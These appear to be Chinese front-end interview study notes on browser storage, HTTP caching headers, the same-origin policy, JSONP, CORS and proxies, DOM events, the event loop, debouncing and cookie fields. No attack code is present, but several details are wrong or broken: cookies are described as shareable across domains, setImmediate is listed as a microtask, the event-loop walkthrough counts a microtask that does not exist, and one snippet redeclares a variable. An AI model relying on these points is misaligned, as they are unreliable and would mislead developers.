> - 存储时间（何时存活）
> - 是否被携带在HTTP请求中？
> - 如何使用
> - 应用场景

浏览器本地存储的四种方式：Cookie，localStorage，sessionStorage和IndexedDB。表格如下：

| 名称           | 生命周期                               | 存储大小         | HTTP请求         |
| :------------- | :------------------------------------- | :--------------- | :--------------- |
| Cookie         | 默认是当前会话有效；也可以指定过期时间 | 一般不超过4KB    | 每次请求都会携带 |
| localStorage   | 永久有效，除非用户手动删除             | 一般为5MB        | 不会随请求发送   |
| sessionStorage | 当前会话有效，关闭浏览器或标签页后失效 | 一般为5MB        | 不会随请求发送   |
| IndexedDB      | 永久有效，除非用户手动删除             | 一般为50MB或更多 | 不会随请求发送   |

**应用场景**

- Cookie：用户的身份信息或偏好设置
- localStorage：用户的长期数据或复杂数据，用户浏览历史，不变的个人信息等
- sessionStorage：用户的短期数据或敏感数据，例如游客登陆信息，临时浏览记录。
- indexedDB：存储资源较大

**关于跨域**

### 扩展阅读

#### Cookie

- 特点：Cookie是一种最早出现的浏览器本地存储方式，它是一种由服务器发送给浏览器的小型文本文件，用于保存用户的身份信息、偏好设置等。
- Cookie的优点是可以在不同的页面或域名之间共享数据，也可以在服务器端读取和修改数据。
- Cookie的缺点是容量很小（一般不超过4KB），==安全性较低（容易被窃取或篡改==），并且每次请求都会携带Cookie，增加了网络开销。
- 使用方法：Cookie的使用方法是通过document.cookie属性来读取或设置Cookie的值。Cookie的值是一个由分号分隔的键值对字符串，例如`name=Alice; age=18`。每个键值对都可以设置一些属性，例如`max-age`表示有效期，`path`表示作用范围，`secure`表示是否只在HTTPS下传输等。例如：

```js
// 设置一个名为name，值为Alice，有效期为7天的Cookie
document.cookie = "name=Alice; max-age=604800";

// 读取所有的Cookie
console.log(document.cookie); // 输出"name=Alice"

// 删除一个名为name的Cookie
document.cookie = "name=; max-age=0";
```

- 使用场景：Cookie适合用于保存一些用户的身份信息或偏好设置等数据，例如用户登录状态、购物车内容、网站主题等。这些数据可以在不同的页面或域名之间共享，并且可以在服务器端验证或修改。例如：

```js
// 用户登录后，服务器发送一个包含用户ID和Token的Cookie
document.cookie = "userId=123; token=abc; max-age=86400";

// 用户访问其他页面时，浏览器会自动携带该Cookie
fetch("/api/user/profile", {
  method: "GET",
  credentials: "include", // 表示允许发送Cookie
}).then((response) => {
  // 服务器根据Cookie验证用户身份，并返回用户资料
  return response.json();
}).then((data) => {
  // 显示用户资料
  console.log(data);
});
```

#### localStorage

- 特点：localStorage是一种HTML5提供的浏览器本地存储方式，它是一种以键值对形式存储数据的对象，用于保存用户的长期数据。
- localStorage的优点是容量较大（一般为5MB），安全性较高（只能在客户端访问），并且不会随请求发送给服务器。
- localStorage的缺点是不能在不同的域名之间共享数据，也不能在服务器端读取或修改数据。
- 使用方法：localStorage的使用方法是通过window.localStorage属性来读取或设置localStorage对象的值。localStorage对象的值是一个由字符串组成的键值对，例如`{"name": "Alice", "age": "18"}`。localStorage对象提供了一些方法来操作数据，例如`setItem`表示添加或更新数据，`getItem`表示获取数据，`removeItem`表示删除数据等。例如：

```js
// 设置一个名为name，值为Alice的localStorage
localStorage.setItem("name", "Alice");

// 读取一个名为name的localStorage
console.log(localStorage.getItem("name")); // 输出"Alice"

// 删除一个名为name的localStorage
localStorage.removeItem("name");
```

- 使用场景：localStorage适合用于保存一些==用户的长期数据或复杂数据==，例如用户浏览历史、收藏夹、草稿箱等。这些数据可以在同一域名下的不同页面之间共享，并且可以在客户端进行增删改查等操作。例如：

```js
// 用户浏览了一个商品页面，将商品ID保存到localStorage中
let productId = "p001";
let history = localStorage.getItem("history") || "[]"; // 获取历史记录，如果没有则为空数组
history = JSON.parse(history); // 将字符串转换为数组
history.push(productId); // 将商品ID添加到数组中
history = JSON.stringify(history); // 将数组转换为字符串
localStorage.setItem("history", history); // 将历史记录保存到localStorage中

// 用户访问个人中心页面时，从localStorage中获取历史记录，并显示在页面上
let history = localStorage.getItem("history") || "[]"; // 获取历史记录，如果没有则为空数组
history = JSON.parse(history); // 将字符串转换为数组
let list = document.getElementById("history-list"); // 获取显示历史记录的列表元素
for (let productId of history) {
  // 根据商品ID创建一个列表项元素，并添加到列表中
  let item = document.createElement("li");
  item.textContent = productId;
  list.appendChild(item);
}
```

#### sessionStorage

- 特点：sessionStorage是一种HTML5提供的浏览器本地存储方式，它和localStorage非常类似，也是一种以键值对形式存储数据的对象，用于保存用户的短期数据。
- sessionStorage和localStorage的区别在于sessionStorage只在当前会话有效，也就是说当用户关闭浏览器或标签页时，sessionStorage中的数据就会被清除。sessionStorage也有类似于localStorage的优缺点，只是它不能在不同的标签页之间共享数据。
- 使用方法：sessionStorage的使用方法是通过window.sessionStorage属性来读取或设置sessionStorage对象的值。sessionStorage对象的值是一个由字符串组成的键值对，例如`{"name": "Alice", "age": "18"}`。sessionStorage对象提供了一些方法来操作数据，例如`setItem`表示添加或更新数据，`getItem`表示获取数据，`removeItem`表示删除数据等。例如：

```js
// 设置一个名为name，值为Alice的sessionStorage
sessionStorage.setItem("name", "Alice");

// 读取一个名为name的sessionStorage
console.log(sessionStorage.getItem("name")); // 输出"Alice"

// 删除一个名为name的sessionStorage
sessionStorage.removeItem("name");
```

- 使用场景：sessionStorage适合用于保存一些用户的短期数据或敏感数据，例如表单输入、验证码、临时密码等。这些数据只在当前会话有效，并且可以在客户端进行增删改查等操作。例如：

```js
// 用户填写了一个表单，将表单内容保存到sessionStorage中，以防止意外刷新或关闭页面导致数据丢失
let form = document.getElementById("form"); // 获取表单元素
let inputs = form.getElementsByTagName("input"); // 获取表单中所有的输入框元素
```

## Etag和last modefined

### last modefined问题

- **Last-Modified**只能精确到秒，秒之内的内容更新Etag才能检测。
- **Last-Modified**不能处理文件内容没有变化但是修改时间变了的问题。文件有时会定时重新生成相同内容，Last-Modified不能很好辨别

### Etag问题

- Etag需要服务器额外计算哈希值，消耗一定的CPU和内存资源。
- Etag的生成算法可能因为服务器的不同而不同，导致同一个资源在不同的服务器上有不同的Etag值，这样就会影响缓存的命中率和一致性。
- Etag的生成算法可能因为资源的动态性而不同，导致一些动态生成的资源，如PHP、JSP等，每次都会产生不同的Etag值，这样就会失去缓存的意义和作用。

### 同时使用

Etag和last modified可以同时使用，服务器会优先验证Etag，如果Etag不匹配，则再验证last modified。这样可以提高缓存控制的效率和准确性。

# 浏览器同源策略

## 一、 介绍一下跨域

> [你可以轻松搞定跨域问题吗？先从浏览器的同源策略入手，跟住我！【渡一教育】_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1wu41187ut/?spm_id_from=333.788.recommend_more_video.2&vd_source=7ce3f834cb0c7108338f1996b4436d48)

### 1. 回答内容

跨域是由浏览器的同源策略造成的。同源策略规定了浏览器只能访问和操作与当前网页同协议、同域名、同端口的资源，否则就会发生跨域。跨域的目的是为了保护用户的隐私和数据安全，防止恶意网站窃取或篡改用户的信息

### 2. 为什么要有同源策略

- **Cookie、LocalStorage 和 IndexDB 无法读写**：这些都是浏览器提供的本地存储功能，用于保存用户的数据和偏好。如果**不同源**的网站可以随意访问这些数据，就可能导致用户的隐私泄露或数据被篡改。
- **DOM 和 Js对象无法获得**：DOM 是文档对象模型，是网页的结构和内容的表示。Js对象是 JavaScript 语言中的基本数据类型，用于存储和处理各种信息。如果不同源的网站可以操作这些对象，就可能导致网页的布局和功能被破坏或恶意修改。
- **AJAX请求不能发送**：AJAX 是一种异步的网络通信技术，用于实现网页的动态更新和交互。如果不同源的网站可以发送 AJAX 请求，就可能导致用户的请求被劫持或伪造，或者获取到敏感的数据和资源。

### 3. 细节

同源策略是浏览器的行为，是为了保护本地数据不被JavaScript代码获取回来的数据污染，<font color='red'>因此拦截的是客户端发出的请求回来的数据接收，即请求发送了，服务器响应了，但是无法被浏览器接收。</font>

## 二、 跨域的解决方案

> - 蛋老师：[跨域的解决方法有哪些？JSONP的原理？CORS怎么使用？Nginx如何设置？\_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1Ei4y1o7jK/?vd_source=7ce3f834cb0c7108338f1996b4436d48)
> - 渡一老师：
>   - CORS：[掌握CORS跨域请求，看这个视频就够了【渡一教育】\_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1fP411e71o/?spm_id_from=333.788.recommend_more_video.-1&vd_source=7ce3f834cb0c7108338f1996b4436d48)
>   - JSONP:[JSONP的原理是什么？它是如何实现跨域的？【渡一教育】\_哔哩哔哩\_bilibili](https://www.bilibili.com/video/BV1XX4y1Y7Eh/?spm_id_from=333.788.recommend_more_video.-1&vd_source=7ce3f834cb0c7108338f1996b4436d48)
>   - 正向代理：[跨域问题解决方案之代理【渡一教育】\_哔哩哔哩\_bilibili](https://www.bilibili.com/video/BV1Ng4y1P7KH/?spm_id_from=333.788.recommend_more_video.1&vd_source=7ce3f834cb0c7108338f1996b4436d48)

### 1. 实现方法简介

跨域的解决方法有多种，常见的有以下几种：

- [**JSONP**：](https://juejin.cn/post/6887425238045458446)[1](https://juejin.cn/post/6887425238045458446)[2](https://zhuanlan.zhihu.com/p/159060398)[3](https://www.cnblogs.com/fundebug/p/10329202.html)[4](https://zhuanlan.zhihu.com/p/132534931)[5](http://www.example.com/path/to/myfile.html?key1=value1&key2=value2)
- [**CORS**：一种标准化的跨域方案，它允许服务器在响应头中设置Access-Control-Allow-Origin字段，指定哪些域可以访问该服务器的资源。优点是支持各种HTTP方法，可以自定义请求头和响应头，安全可靠；缺点是需要服务器端配合设置，低版本浏览器不支持。适用于一些需要高安全性和灵活性的场景，如用户登录、文件上传等。](https://juejin.cn/post/6887425238045458446)[1](https://juejin.cn/post/6887425238045458446)[2](https://zhuanlan.zhihu.com/p/159060398)[3](https://www.cnblogs.com/fundebug/p/10329202.html)[4](https://zhuanlan.zhihu.com/p/132534931)[5](http://www.example.com/path/to/myfile.html?key1=value1&key2=value2)
- [**降域**：将不同子域的document.domain设置为相同的主域，从而实现同源。优点是简单方便，不需要服务器端设置；缺点是只能用于子域之间的跨域，不能跨协议或端口，可能存在安全风险。适用于一些属于同一个主域但不同子域的网站之间的通信场景，如电商网站和支付网站等。](https://juejin.cn/post/6887425238045458446)[1](https://juejin.cn/post/6887425238045458446)[2](https://zhuanlan.zhihu.com/p/159060398)[3](https://www.cnblogs.com/fundebug/p/10329202.html)[4](https://zhuanlan.zhihu.com/p/132534931)[5](http://www.example.com/path/to/myfile.html?key1=value1&key2=value2)
- [**PostMessage**：HTML5提供的一种API，它可以让不同源的窗口之间传递消息，从而实现跨域通信。优点是简单易用，支持多种数据类型，兼容性好；缺点是需要双方约定好消息格式和来源，否则可能导致数据混乱或泄露。适用于一些需要在不同窗口或iframe之间交换数据的场景，如网页嵌套、第三方登录等。](about:blank#)[1](https://juejin.cn/post/6887425238045458446)[2](https://zhuanlan.zhihu.com/p/159060398)[3](https://www.cnblogs.com/fundebug/p/10329202.html)[4](https://zhuanlan.zhihu.com/p/132534931)[5](http://www.example.com/path/to/myfile.html?key1=value1&key2=value2)



- **JSONP**

  - 利用 `<script>` 标签不受浏览器同源策略的影响，通过 src 属性，请求非同源的 js 脚本，并通过**函数调用**的形式，接收跨域接口响应回来的数据。
  - 优点是简单易用，兼容性好；
  - 缺点是只支持GET方法，不安全，可能遭受XSS攻击。
  - 适用于一些简单的数据获取场景，如天气预报、股票行情等。

- **CORS**（Cross-Origin Resource Sharing）跨域资源共享

  - 它允许服务器在响应头中设置Access-Control-Allow-Origin字段，指定哪些域可以访问该服务器的资源。
  - 优点是支持各种HTTP方法，可以自定义请求头和响应头，安全可靠；
  - 缺点是需要服务器端配合设置，低版本浏览器不支持。
  - 适用于一些需要高安全性和灵活性的场景，如用户登录、文件上传等

- **代理**

  - 它的原理是利用服务器端请求不会受到同源策略的限制，让服务器端作为中间人，转发客户端和目标服务器之间的请求和响应。

  - **正向代理**：在客户端配置一个代理服务器，如proxy或fiddler，将客户端的请求通过代理服务器发送到目标服务器，并将目标服务器的响应通过代理服务器返回给客户端。这样，客户端和目标服务器之间可以跨域，而代理服务器和目标服务器之间是同源的。优点是可以绕过一些网络限制，如防火墙或地域限制；缺点是需要在每个客户端上配置代理，可能影响用户体验。适用于一些需要访问受限资源或测试网络环境的场景，如科学上网、抓包分析等。

  - **反向代理**：在服务器端配置一个代理服务器，如nginx或apache，将客户端的请求转发到目标服务器，并将目标服务器的响应返回给客户端。这样，客户端和代理服务器之间是同源的，而代理服务器和目标服务器之间可以跨域。优点是可以隐藏目标服务器的真实地址，提高安全性和性能；缺点是需要额外的服务器资源和维护成本。适用于一些需要高安全性和高性能的场景，如电商网站、金融网站等。

    

- **WebSocket**：WebSocket是一种协议，可以实现跨域通信，支持全双工通信，可以保持长连接。

- **postMessage**：postMessage是HTML5新增的API，可以实现跨窗口通信，适用于在同一页面或不同页面的iframe之间进行通信。

### 2. 详解JSONP

> (JSON with Padding)

##### 1. JSONP的原理

由于浏览器同源策略的限制，网页中无法通过 Ajax 请求非同源的接口数据。但是 `<script>` 标签不受浏览器同源策略的影响，可以通过 src 属性（src属性可以设置url，表示请求地址），请求非同源的 js 脚本。通过`Content-Type: text/javascript`来设置返回文件的类型，<a href="#src返回">默认是JavaScript</a>。

因此，JSONP 的实现原理，就是通过 `<script>` 标签的 src 属性，请求跨域的数据接口，并通过**函数调用**的形式，接收跨域接口响应回来的数据。

##### 2. JSONP的实现

- 定义一个全局的回调函数，在JSONP响应返回时调用该函数

  ```js
   <script>
     function success(data) {
       console.log('获取到了data数据：')
       console.log(data)
     }
   </script>
  ```

- 动态创建script标签，设置其src属性为需要请求的URL，其中包括传递给后台的<font color='red'>参数</font>和<font color='red'>回调函数名称</font>。

  ```html
  <script src="http://ajax.frontend.itheima.net:3006/api/jsonp?callback=success&name=zs&age=20"></script>
  ```

- 后台接收到请求后，解析出请求参数和回调函数名称，将数据包装成一个函数调用的形式返回给前端。

- 前端接收到响应后，调用全局回调函数，将返回的数据传递给该函数，从而完成数据处理和展示。

##### 3. JSONP的缺点和注意

由于 JSONP 是通过 `<script>` 标签的 src 属性，来实现跨域数据获取的，所以，JSONP 只支持 GET 数据请求，不支持 POST 请求。

注意：**JSONP** **和** **Ajax** **之间没有任何关系**，不能把 JSONP 请求数据的方式叫做 Ajax，因为 JSONP 没有用到 XMLHttpRequest 这个对象。

### 3. 详解CORS

（Cross-Origin Resource Sharing）跨域资源共享

##### 1. CORS含义

CORS（Cross-Origin Resource Sharing）是一种机制，它允许在浏览器中运行的 Web 应用程序访问跨源服务器上的资源。CORS 是一个安全机制，用于限制通过浏览器发送的跨域请求对服务器资源的访问，以保护用户的隐私和安全。

##### 2. 工作原理

CORS 的工作原理是通过在服务器端设置一些特殊的 HTTP 头来允许跨域请求。

当浏览器发送跨域请求时，服务器会检查请求中的 Origin 头部，并决定是否允许该请求访问资源。

如果服务器允许该请求，那么它会在响应中包含一些特殊的头部，例如 Access-Control-Allow-Origin 和 Access-Control-Allow-Methods 等，以通知浏览器该请求已被授权。

##### 3. 请求过程

1. 浏览器向服务器发送跨域请求，并在请求头中包含 Origin 头部【协议+域名+端口】。
2. 服务器收到请求后检查 Origin 头部，并确定是否允许该请求访问资源。
3. 如果服务器允许该请求，那么它会在响应中包含 Access-Control-Allow-Origin 和 Access-Control-Allow-Methods 等头部，以授权该请求。
4. 浏览器收到响应后会检查 Access-Control-Allow-Origin 和 Access-Control-Allow-Methods 等头部，以确定该请求是否被授权。如果该请求被授权，那么浏览器就会将响应传递给 JavaScript 代码，并允许它访问资源。

### 4. 详解服务器代理

> [代理（proxy）跨域\_代理跨域\_奥特曼　的博客-CSDN博客](https://blog.csdn.net/m0_46846526/article/details/118151968)

##### 1. 本质

在服务器之间进行数据交互的过程中不存在跨域问题，因为服务器之间是通过 IP 地址和端口号来进行通信的，而不是通过域名。跨域问题主要是出现在**客户端浏览器**与**服务器**之间的交互中。

##### 2. 代理的介绍

服务器代理和反向代理都是代理服务器的一种形式，不同之处在于它们所处的位置和处理请求的方式。

服务器代理，也称为正向代理，是处于客户端和目标服务器之间的一台代理服务器，用于转发客户端请求并获取目标服务器的响应。客户端并不直接与目标服务器通信，而是通过服务器代理来实现。常见的应用场景包括突破网络访问限制、加速访问速度、隐藏真实IP等。

反向代理则是位于目标服务器和客户端之间的一台代理服务器，用于将客户端的请求转发到目标服务器，并将目标服务器的响应返回给客户端。客户端并不知道自己实际访问的是哪台服务器，而是通过反向代理来实现。常见的应用场景包括负载均衡、安全保护、Web加速等。

总的来说，正向代理和反向代理的区别在于代理的方向不同，正向代理是客户端找代理，反向代理是代理找服务器。同时，反向代理更多的是用于服务器端的负载均衡和安全等问题，而正向代理更多的是用于客户端的网络访问问题。

# 浏览器事件机制

## 一、事件模型

介绍一下DOM的事件模型

## 二、事件触发过程

事件触发的过程是指在浏览器中，当一个元素发生某种交互行为（如点击、鼠标移动、键盘输入等）时，如何通知其他元素或者执行相应的操作的过程。

事件触发的过程一般分为三个阶段**：事件捕获**、**事件目标**和**事件冒泡**。下面我将简要介绍这三个阶段的含义和特点。

- 事件捕获：事件捕获是指从根节点（document）开始，沿着DOM树向下寻找目标元素，途经的每个节点都可以捕获到这个事件。事件捕获的目的是为了在事件到达目标之前就做一些预处理或者拦截。
- 事件目标：事件目标是指触发事件的那个元素，也就是事件捕获阶段的终点。在这个阶段，事件目标可以根据自己的逻辑来响应和处理该事件，比如执行一个函数或者改变自身的样式等。
- 事件冒泡：事件冒泡是指从事件目标开始，沿着DOM树向上回溯，途中经过的每个节点都可以监听和处理该事件。事件冒泡的目的是为了让父节点或者祖先节点也能够感知和参与该事件，实现一些复杂的功能或者逻辑

**如何阻止事件冒泡？**

event.stopPropagation()

## 三、事件委托

### 1. 事件委托的概念

事件委托本质上是利用了**浏览器事件冒泡**的机制。因为事件在冒泡过程中会上传到父节点，父节点可以通过**事件对象获取到目标节点**，因此可以把子节点的**监听函数**定义在父节点上，由父节点的监听函数统一处理多个子元素的事件，这种方式称为事件委托 (事件代理)。

使用事件委托可以不必要为每一个子元素都绑定一个监听事件，这样减少了内存上的消耗。并且使用事性代理还可以实现事件的动态绑定，比如说新增了一个子节点，并不需要单独地为它添加一个监听事件，它绑定的事件会交给父元素中的监听函数来处理。

### 2. 事件委托的特点

优点

缺点

### 3. 事件委托的场景



## 六、事件循环

> - [【前端八股文】事件循环-eventloop\_哔哩哔哩\_bilibili](https://www.bilibili.com/video/BV1j14y1j7us/?spm_id_from=333.337.search-card.all.click&vd_source=7ce3f834cb0c7108338f1996b4436d48)
>

### 问题回答

JavaScript是单线程的，为了防止阻塞代码，将JavaScript代码分为同步代码和异步代码。同步代码会按照书写顺序依次执行，形成一个执行栈。异步代码则会交给浏览器辅助线程处理，不会阻塞主线程的执行，当异步任务在完成后，会将回调函数放入一个任务队列中。当执行栈为空时，主线程会从任务队列中取出一个任务，放入执行栈中执行。这个过程就叫做事件循环。同时任务队列又分为宏任务队列和微任务队列，每次事件循环，主线程都会先执行完所有的微任务，再执行一个宏任务。这样可以保证微任务的优先级高于宏任务。

浏览器是一个**多线程的环境**，它有一个主线程和多个辅助线程。主线程负责执行JavaScript代码，而辅助线程负责处理一些耗时的任务，比如网络请求、定时器、事件监听等。这些任务在完成后，会将回调函数放入一个任务队列中，等待主线程空闲时执行。

JavaScript代码分为同步代码和异步代码。同步代码会按照书写顺序依次执行，形成一个执行栈。异步代码则会交给浏览器辅助线程处理，不会阻塞主线程的执行。当执行栈为空时，主线程会从任务队列中取出一个任务，放入执行栈中执行。这个过程就叫做事件循环。

任务队列又分为宏任务队列和微任务队列。宏任务队列包含了一些大的任务，比如网络请求、定时器、用户交互等。微任务队列包含了一些小的任务，比如Promise的回调、MutationObserver的回调等。每次事件循环，主线程都会先执行完所有的微任务，再执行一个宏任务。这样可以保证微任务的优先级高于宏任务。

**注**：

- JavaScript主线程的浏览器的主线程概念相同，指的都是用来执行JavaScript得到线程。

### 一个事件循环的流程

JavaScript 事件循环是一种机制，用来协调单线程执行环境中的同步任务和异步任务。同步任务会直接进入主线程执行，异步任务会进入任务队列等待主线程空闲时执行。任务队列又分为宏任务队列和微任务队列，宏任务队列包括 script、setTimeout、setInterval、I/O、UI 交互事件等，微任务队列包括 Promise、MutationObserver、process.nextTick 等。每个事件循环的开始和结束可以用以下的流程图来表示：

- 事件循环的开始：从宏任务队列中取出最先进入的任务（如果有的话），并执行它。
- 事件循环的结束：检查微任务队列，如果有微任务，则一直执行微任务，直到清空微任务队列。然后更新渲染界面，再回到事件循环的开始。

**总结：事件循环指的是一个宏任务执行的过程，先执行宏任务中的同步代码，再执行微任务队列中的代码，微任务队列为空，表示事件循环结束。**

举个例子，假设当前代码中有以下的宏任务和微任务：

```js
console.log('script start'); // 宏任务1

setTimeout(function() { // 宏任务2
  console.log('timeout1');
}, 10);

new Promise(resolve => { 
  console.log('promise1');
  resolve();
  setTimeout( () => console.log('timeout2'), 10); // 宏任务3
}).then(function() { // 微任务1
  console.log('then1')
})

console.log('script end'); // 宏任务1
```

那么每个事件循环的开始和结束如下：

- 第一个事件循环的开始：执行宏任务1，输出 script start 和 promise1，将宏任务2和3放入宏任务队列，将微任务1和2放入微任务队列，输出 script end。
- 第一个事件循环的结束：执行微任务1，输出 then1，清空微任务队列，更新渲染界面。
- 第二个事件循环的开始：执行宏任务2，输出 timeout1。
- 第二个事件循环的结束：没有微任务，更新渲染界面。
- 第三个事件循环的开始：执行宏任务3，输出 timeout2。
- 第三个事件循环的结束：没有微任务，更新渲染界面。



## 七、宏任务微任务

> [【前端八股文】事件循环-宏任务和微任务\_哔哩哔哩\_bilibili](https://www.bilibili.com/video/BV1G84y1B7hZ/?spm_id_from=333.788&vd_source=7ce3f834cb0c7108338f1996b4436d48)

### 宏任务

- script代码块
- 两个定时器
- Ajax，Fetch
- 事件绑定
- I/O操作

#### 微任务

- Promise中的then，catch等方法
- process.nextTick （node）
- setImmediate (node)
- Async/Await
- Object.observe等

## 八、执行栈



## 九、Nodejs中的事件循环

> [面试题：说说事件循环机制(满分答案来了)-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1601176)

- 定时器检测阶段(timers)：本阶段执行 timer 的回调，即 setTimeout、setInterval 里面的回调函数。

- I/O事件回调阶段(I/O callbacks)：执行延迟到下一个循环迭代的 I/O 回调，即上一轮循环中未被执行的一些I/O回调。

- 闲置阶段(idle, prepare)：仅系统内部使用。

- 轮询阶段(poll)：检索新的 I/O 事件；执行与 I/O 相关的回调（几乎所有情况下，除了关闭的回调函数，那些由计时器和 setImmediate() 调度的之外），其余情况 node 将在适当的时候在此阻塞。

  如果当前已经存在定时器，而且有定时器到时间了，拿出来执行，eventLoop 将回到 timers 阶段。

  如果没有定时器, 会去看回调函数队列。

  - 如果 poll 队列不为空，会遍历回调队列并同步执行，直到队列为空或者达到系统限制
  - 如果 poll 队列为空时，会有两件事发生
    - 如果有 setImmediate 回调需要执行，poll 阶段会停止并且进入到 check 阶段执行回调
    - 如果没有 setImmediate 回调需要执行，会等待回调被加入到队列中并立即执行回调，这里同样会有个超时时间设置防止一直等待下去,一段时间后自动进入 check 阶段。

- 检查阶段(check)：setImmediate() 回调函数在这里执行

- 关闭事件回调阶段(close callback)：一些关闭的回调函数，如：socket.on('close', ...)。

## 十、事件绑定相关



# 浏览器优化

## 防抖和节流

### 概念

当多次执行某一动作，进行函数调用次数的限制，节省资源；

### 区别/场景

#### 防抖

在事件触发n秒后执行函数，如果在n秒内再次触发，重新计时

#### 节流

多次触发事件时，在n秒时间内，只执行一次回调函数。

#### 区别

函数节流不管事件触发有多频繁，都会保证在规定时间内一定会执行一次真正的事件处理函数，而函数防抖只是在最后一次事件后才触发一次函数。

#### **函数防抖的应用场景**

连续的事件，只需**触发一次回调**的场景有：

- 搜索框输入：当用户在搜索框中输入关键词时，需要在用户停止输入一定时间后才执行搜索函数，而不是每次输入都触发搜索。
- 表单验证：当用户在表单中输入数据时，需要在用户停止输入一定时间后才执行验证函数，而不是每次输入都触发验证
- 按钮点击：当用户点击一个按钮时，需要在用户停止点击一定时间后才执行按钮的功能，而不是每次点击都触发功能。

#### **函数节流的应用场景**

节流适用于需要按照固定频率响应事件的场景：

- 滚动加载，加载更多或滚到底部监听，window.onscroll和滑到底部自动加载更多

- 调整窗口大小Resize：当用户调整浏览器窗口大小时，需要按照一定的时间间隔重新计算页面的布局，而不是每次改变都触发计算。这样可以避免频繁的DOM操作和页面重绘，提高页面的性能和流畅度。
- 鼠标的mousemove、mouseover

### 手写

# 参考文献/描述



# 事件相关

### 事件简介

#### 1. 事件类型

#### 2. 事件的绑定

- HTML标签直接写
- DOM元素 获取dom元素，elem.on<event>绑定
- 使用addEventListener添加方法，elem.addEventListener(事件，回调)

#### 3. 事件对象

- event.type, event.currentTarget.....

### 冒泡和捕获



#### 1. 冒泡

##### 1.1 事件冒泡含义

当一个事件发生在一个元素上，它会首先运行在该元素上的处理程序，然后运行其父元素上的处理程序，然后一直向上到其他祖先上的处理程序。

##### 1.2 冒泡传递过程中event事件

父元素上的处理程序始终可以获取事件实际发生位置的详细信息。

**引发事件的那个嵌套层级最深的元素被称为目标元素,可以通过 `event.target` 访问。**

注意与 `this`（=`event.currentTarget`）之间的区别：

- `event.target` —— 是引发事件的“目标”元素，它在冒泡过程中不会发生变化。
- `this` —— 是“当前”元素，其中有一个当前正在运行的处理程序。

#### 2. 捕获

### 事件委托

### 事件循环

### 面试题

#### 1. 事件冒泡和事件捕获

事件冒泡和捕获是两种不同的事件传播方式，它们描述了当一个元素触发事件时，这个事件如何在它的父元素和子元素之间传递。

事件冒泡是指当一个元素触发事件时，这个事件会从最内层的元素开始，逐层向外传播，直到最外层的元素。也就是说，先触发当前元素的事件处理函数，然后再触发它的父元素的事件处理函数，依次类推，直到 document 对象。

事件捕获是指当一个元素触发事件时，这个事件会从最外层的元素开始，逐层向内传播，直到最内层的元素。也就是说，先触发 document 对象的事件处理函数，然后再触发它的子元素的事件处理函数，依次类推，直到当前元素。

事件冒泡和捕获都是为了实现事件委托，即利用事件在 DOM 树中的传播机制，让父元素或祖先元素代替子元素或后代元素处理事件，从而减少事件监听器的数量，提高性能。

我们可以使用 addEventListener 方法来为元素添加事件监听器，并指定第三个参数 useCapture 来决定是在冒泡阶段还是捕获阶段执行事件处理函数。默认情况下，useCapture 为 false，表示在冒泡阶段执行。如果设置为 true，则表示在捕获阶段执行。

我们也可以使用 stopPropagation 方法来阻止事件的进一步传播，即在当前元素执行完事件处理函数后，不再向外或向内传递。这样可以避免一些不必要的冲突或重复操作。

#### 2. 说一下事件委托

事件委托的原理是基于事件的传播机制，即当一个元素触发事件时，这个事件会在它的父元素和子元素之间传递。我们可以利用这个特性，让一个元素代替它的子元素或后代元素处理事件，从而减少事件监听器的数量，提高性能。

例如，如果我们有一个 ul 元素，里面有很多个 li 元素，我们想要给每个 li 元素添加点击事件。如果我们直接为每个 li 元素都添加事件监听器，那么会占用很多内存，并且如果动态添加或删除 li 元素，还需要更新事件监听器。但是如果我们利用事件委托，只为 ul 元素添加一个事件监听器，然后在事件处理函数中判断触发事件的元素是哪个 li 元素，就可以实现同样的效果，而且更加灵活和高效。

**优点**

- 减少事件监听器的数量，节省内存和提高性能。
- 动态添加或删除子元素或后代元素时，无需更新事件监听器，更加灵活和高效。

**局限性**

- 事件必须能够冒泡
- 其次，委托可能会增加 CPU 负载，因为容器级别的处理程序会对容器中任意位置的事件做出反应，而不管我们是否对该事件感兴趣。

# 会话控制

## Cookie

### 概念

Cookie 是一种服务端保存在浏览器端的数据片段，以 key/value 的形式进行保存。每次请求的时候，请求头会自动包含本网站此目录下的 Cookie 数据。网站经常使用这个技术来识别用户是否登录等功能。

**注：**浏览器发送请求的时候，会自动携带相同域名下的cookie

### 特点

- Cookie 是由服务端通过 Set-Cookie 响应头发送给浏览器的，浏览器收到后会保存在本地。
- Cookie 有一定的大小限制，一般不超过 4KB，不同的浏览器可能有不同的限制。
- Cookie 有一个域名和路径的作用范围，只有在相同的域名和路径下，浏览器才会发送 Cookie 给服务端。
- Cookie 可以设置一个过期时间，如果没有设置，则默认为浏览器关闭时过期。
- Cookie 可以设置一些属性，如 HttpOnly（防止被 JavaScript 访问），Secure（只能通过 HTTPS 传输），SameSite（防止跨站请求伪造）等。

Cookie 是一种实现状态管理的技术，它可以让无状态的 HTTP 协议记住用户的信息和偏好。但是 Cookie 也有一些缺点，如占用带宽，降低性能，存在安全风险等。因此，在使用 Cookie 时要注意合理地设置其大小，作用范围，过期时间和属性。

### cookie字段

关于 cookie 的字段，你可以在后端设置以下几种：
- **name** 和 **value**：这是 cookie 的基本组成部分，表示 cookie 的名称和值。例如，`Set-Cookie: yummy_cookie=choco`¹。

- **Expires** 和 **Max-Age**：这两个字段用于定义 cookie 的生命周期，即 cookie 何时会被删除。**Expires** 指定了一个具体的日期，而 **Max-Age** 指定了一个时间段。例如，`Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;`。

- **Secure** 和 **HttpOnly**：这两个字段用于限制 cookie 的访问权限，以提高 cookie 的安全性。**Secure** 表示 cookie 只能通过 HTTPS 协议发送，而 **HttpOnly** 表示 cookie 不能被 JavaScript 访问。例如，`Set-Cookie: id=a3fWa; Secure; HttpOnly`。

- **Domain** 和 **Path**：这两个字段用于定义 cookie 的作用域，即哪些主机和路径可以接收 cookie。

  这里的“允许访问”指的是，访问指定的域或者路径才会携带该cookie

  - **Domain** 指定了允许访问 cookie 的域名，如果不指定，默认为同一 host 设置 cookie 的域名。
  - **Path** 指定了允许访问 cookie 的 URL 路径，如果不指定，默认为同一 host 设置 cookie 的路径。例如，`Set-Cookie: name=value; Domain=example.com; Path=/blog`。


